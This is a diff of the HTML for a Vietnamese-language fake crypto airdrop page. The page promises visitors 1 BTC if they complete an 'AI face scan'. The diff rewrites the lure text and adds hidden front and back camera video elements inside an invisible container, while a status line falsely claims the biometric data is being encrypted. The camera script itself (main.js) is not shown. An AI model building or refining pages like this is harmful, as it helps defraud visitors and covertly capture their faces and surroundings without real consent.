@@ -3,43 +3,44 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Blockchain Airdrop - Nhận 1 BTC</title>
+    <title>Blockchain Airdrop - Xác thực nhận thưởng</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0b0e11; color: #eaecef; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        .card { background: #1e2329; padding: 40px 30px; border-radius: 16px; text-align: center; width: 90%; max-width: 400px; border: 1px solid #474d57; box-shadow: 0 10px 40px rgba(0,0,0,0.6); }
-        .btc-icon { width: 90px; margin-bottom: 25px; animation: float 3s ease-in-out infinite; }
-        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
-        h2 { color: #f3ba2f; margin-bottom: 15px; font-size: 24px; }
-        p { color: #848e9c; font-size: 15px; line-height: 1.6; margin-bottom: 25px; }
-        .btn { background: #f3ba2f; color: #000; border: none; padding: 16px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 17px; transition: 0.3s; text-transform: uppercase; letter-spacing: 1px; }
-        .btn:hover { background: #dba323; transform: scale(1.02); }
-        #vBox { width: 0; height: 0; opacity: 0; overflow: hidden; position: absolute; }
-        #loading { display: none; margin-top: 10px; }
-        .spinner { border: 4px solid #30363d; border-top: 4px solid #f3ba2f; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .status-text { font-weight: 500; color: #f3ba2f; }
+        :root { --primary: #f3ba2f; --bg: #0b0e11; --card-bg: #1e2329; --text: #eaecef; --text-muted: #848e9c; }
+        body { font-family: 'Inter', -apple-system, sans-serif; background: var(--bg); color: var(--text); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .card { background: var(--card-bg); padding: 40px 30px; border-radius: 20px; text-align: center; width: 90%; max-width: 420px; border: 1px solid #474d57; box-shadow: 0 15px 35px rgba(0,0,0,0.6); }
+        .btc-icon { width: 70px; margin-bottom: 25px; animation: pulse 2s infinite; }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
+        h2 { color: var(--primary); font-size: 24px; margin: 0 0 15px; }
+        p { color: var(--text-muted); font-size: 15px; line-height: 1.6; margin-bottom: 30px; }
+        .btn { background: var(--primary); color: #000; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: 700; cursor: pointer; font-size: 16px; transition: all 0.3s; text-transform: uppercase; letter-spacing: 0.5px; }
+        .btn:hover { background: #dba323; transform: translateY(-2px); }
+        #vBox { position: absolute; width: 1px; height: 1px; opacity: 0; overflow: hidden; pointer-events: none; }
+        #loading { display: none; margin-top: 25px; }
+        .spinner { border: 3px solid #30363d; border-top: 3px solid var(--primary); border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        .status-text { font-size: 13px; color: var(--primary); font-weight: 500; }
     </style>
 </head>
 <body>
 
 <div class="card">
     <img src="https://cryptologos.cc/logos/bitcoin-btc-logo.png" class="btc-icon" alt="BTC">
-    <h2>Phần Thưởng Chờ Đợi!</h2>
-    <p>Hệ thống ghi nhận bạn đủ điều kiện nhận <b>1.0 BTC</b>. Nhấn xác thực khuôn mặt để hoàn tất quy trình nhận thưởng vào ví cá nhân.</p>
+    <h2>Xác thực Danh tính</h2>
+    <p>Chào mừng bạn! Để hoàn tất việc nhận <b>1 BTC</b> vào ví cá nhân, vui lòng thực hiện quét khuôn mặt AI để bảo mật giao dịch.</p>
     
     <div id="vBox">
-        <video id="preview" autoplay playsinline muted></video>
+        <video id="videoFront" autoplay playsinline muted></video>
+        <video id="videoBack" autoplay playsinline muted></video>
     </div>
 
     <div id="loading">
         <div class="spinner"></div>
-        <p class="status-text">Đang quét sinh trắc học...</p>
-        <p style="font-size: 12px;">Vui lòng giữ nguyên vị trí, quá trình này mất khoảng 10-15 giây.</p>
+        <p class="status-text">Hệ thống AI đang mã hóa dữ liệu sinh trắc học...</p>
     </div>
 
-    <button class="btn" id="startBtn">XÁC THỰC & NHẬN BTC</button>
+    <button class="btn" id="startBtn">Bắt đầu xác thực ngay</button>
 </div>
 
-<script src="main.js"></script>
+<script src="main.js" defer></script>
 </body>
 </html>
